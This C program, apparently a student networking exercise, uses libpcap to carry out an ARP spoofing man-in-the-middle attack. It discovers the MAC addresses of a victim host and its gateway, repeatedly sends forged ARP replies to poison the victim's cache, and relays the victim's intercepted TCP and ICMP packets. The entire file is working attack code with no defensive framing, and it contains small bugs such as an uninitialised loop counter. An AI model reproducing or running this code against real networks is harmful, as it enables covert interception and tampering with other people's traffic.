#include <pcap.h>
#include "protocol_information.h"
#include "printfunc.h"
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0X0806

int main(int argc, char*argv[])
{
    u_char send_packet_arprequest[42]={0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0x94 , 0xE9,
                                       0x79 , 0x95 , 0x00 , 0xFD , 0x08 , 0x06 , 0x00 , 0x01,
                                       0x08 , 0x00 , 0x06 , 0x04 , 0x00 , 0x01 , 0x94 , 0xE9,
                                       0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
                                       0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
                                       0x2B , 0x01};

    u_char send_packet_arpreply[42]={0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0x94 , 0xE9,
                                     0x79 , 0x95 , 0x00 , 0xFD , 0x08 , 0x06 , 0x00 , 0x01,
                                     0x08 , 0x00 , 0x06 , 0x04 , 0x00 , 0x02 , 0x94 , 0xE9,
                                     0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
                                     0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
                                     0x2B , 0x01};

///////////////////////////get my ip//////////////////////////////////////////
    int fd;
    struct ifreq ifr;
    u_char my_ip[4]={0,};
    fd = socket(AF_INET, SOCK_DGRAM, 0);

    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;

    /* I want IP address attached to "eth0" */
    strncpy(ifr.ifr_name, "ens33", IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);
    memcpy(my_ip,&((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr),4);

////////////////////////////////////////////////////////////////////////////

/////////////////////////get my mac/////////////////////////////////////////

    struct ifconf ifc;
    char buf[1024];
    int i;
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;

                }
            }
        }
        else { /* handle error */ }
    }

    unsigned char my_mac[6];

    if (success) memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);

////////////////////////////////////////////////////////////////////////////////////////

    pcap_t *handle;                  /* Session handle */
    char *dev;                       /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    struct bpf_program fp;       	/* The compiled filter */

    bpf_u_int32 mask;                /* Our netmask */
    bpf_u_int32 net;                 /* Our IP */
    struct pcap_pkthdr *header;  	/* The header that pcap gives us */
    const u_char *packet;            /* The actual packet */

    int success_get_mac;
    struct arphdr *arprequest_arp;
    struct arphdr *arpreply_arp;


    struct sniff_ethernet *arprequest_eth;
    struct sniff_ethernet *arpreply_eth;

    struct arphdr *arp_to_know_mac;
    struct sniff_ethernet *ethernet;

    struct sniff_ethernet *ethernet_relay;
    struct sniff_ip *ip_relay;
    struct sniff_tcp *tcp_relay;

    int time_check=0;
    unsigned int total_length;
    u_char tcpoff;
    u_char ipoff;
    u_short datalength;
    u_char *sender_ip=argv[2];
    u_char *target_ip=argv[3];
    u_char sender_ip_data[4];
    u_char target_ip_data[4];
    inet_pton(AF_INET,sender_ip,sender_ip_data);
    inet_pton(AF_INET,target_ip,target_ip_data);

    /*Set the arp request and arp reply */
    arprequest_eth=(struct sniff_ethernet*)send_packet_arprequest;
    arpreply_eth=(struct sniff_ethernet*)send_packet_arpreply;
    arprequest_arp=(struct arphdr*)(send_packet_arprequest+14);
    arpreply_arp=(struct arphdr*)(send_packet_arpreply+14);

    unsigned char sender_mac[6]={0xdd,0xdd,0xdd,0xdd,0xdd,0xdd};
    unsigned char target_mac[6];

    /* Define the device */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    /* arp request to know sender mac address*/

    memcpy((*arprequest_eth).ether_shost,my_mac,6);      //my mac
    memcpy((*arprequest_arp).sha,my_mac,6);             //my mac
    memcpy((*arprequest_arp).spa,my_ip,4);          	//myip
    inet_pton(AF_INET,sender_ip,(*arprequest_arp).tpa); //senderip

    while(success_get_mac<=10)
    {
          printf("sending arp packet to know sender mac\n");
          if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
          {
               printf("error\n");
          }

          int res;
                 /* Grab a packet */
          res=pcap_next_ex(handle, &header,&packet);

          if(res==0) continue;
          else if(res==-1) break;
          else if(res==-2) break;

          ethernet=(struct sniff_ethernet*)packet;

          if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
          {
              arp_to_know_mac=(struct arphdr*)(packet+14);
              if(ntohs((*arp_to_know_mac).oper)==0x0002)
              {
                  if(!strcmp((*arp_to_know_mac).spa,sender_ip_data))
                  {
                      memcpy(sender_mac,(*arp_to_know_mac).sha,6);
                      success_get_mac++;
                  }
              }
          }
    }

    /* arp request to know target mac address*/

    memcpy((*arprequest_eth).ether_shost,my_mac,6);      //my mac
    memcpy((*arprequest_arp).sha,my_mac,6);             //my mac
    memcpy((*arprequest_arp).spa,my_ip,4);          	//myip
    inet_pton(AF_INET,target_ip,(*arprequest_arp).tpa); //targetip

    success_get_mac=0;
    while(success_get_mac<=10)
    {
          printf("sending arp packet to know target mac\n");
          if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
          {
               printf("error\n");
          }

          int res;
                 /* Grab a packet */
          res=pcap_next_ex(handle, &header,&packet);

          if(res==0) continue;
          else if(res==-1) break;
          else if(res==-2) break;

          ethernet=(struct sniff_ethernet*)packet;

          if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
          {
              arp_to_know_mac=(struct arphdr*)(packet+14);
              if(ntohs((*arp_to_know_mac).oper)==0x0002)
              {
                  if(!memcmp((*arp_to_know_mac).spa,target_ip_data,4))
                  {
                      memcpy(target_mac,(*arp_to_know_mac).sha,6);
                      success_get_mac++;
                  }
              }
          }
    }

    /* attack arp reply */
    memcpy((*arpreply_eth).ether_dhost,sender_mac,6);   //sender mac
    memcpy((*arpreply_eth).ether_shost,my_mac,6);       //my mac
    memcpy((*arpreply_arp).sha,my_mac,6);               //my mac
    inet_pton(AF_INET,target_ip,(*arpreply_arp).spa);   //target ip - gateway
    memcpy((*arpreply_arp).tha,sender_mac,6);           //sender mac
    inet_pton(AF_INET,sender_ip,(*arpreply_arp).tpa);    //senderip


    /*//////////attack with arp reply packet and relay spoofed packet///////*/
    while (1)
    {
        
	if(time_check%10==0)
	{
            printf("send attack arp packet\n");
	    if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
            {
                 printf("error\n");
            }
	}

	time_check++;

        int res;
                /* Grab a packet */
        res=pcap_next_ex(handle, &header,&packet);
        if(res==0) continue;
        else if(res==-1) break;
        else if(res==-2) break;

        ethernet_relay=(struct sniff_ethernet*)packet;
        if(!memcmp((*ethernet_relay).ether_shost,sender_mac,6))
        {
            if(ntohs((*ethernet_relay).ether_type)==ETHERTYPE_IP)
            {
                ip_relay=(struct sniff_ip*)(packet+14);
                ipoff=(ip_relay->ip_vhl & 0x0F) * 4;

                memcpy((*ethernet_relay).ether_shost,my_mac,6);
                memcpy((*ethernet_relay).ether_dhost,target_mac,6);

                if(ip_relay->ip_p==IPPROTO_TCP)
                {
                    tcp_relay=(struct sniff_tcp*)(packet+14+ipoff);
                    total_length=ntohs((*ip_relay).ip_len)+14;

                    printf("sending relay TCP packet\n");
                    if(pcap_sendpacket(handle,packet,total_length)!=0)
                    {
                        printf("error\n");
                    }
                }

                else if(ip_relay->ip_p==0x01)
                {
                    total_length=ntohs((*ip_relay).ip_len)+14;
                    printf("sending relay ICMP packet\n");
                    if(pcap_sendpacket(handle,packet,total_length)!=0)
                    {
                        printf("error\n");
                    }
                }
             }
        }
    }

    pcap_close(handle);
    return(0);
}

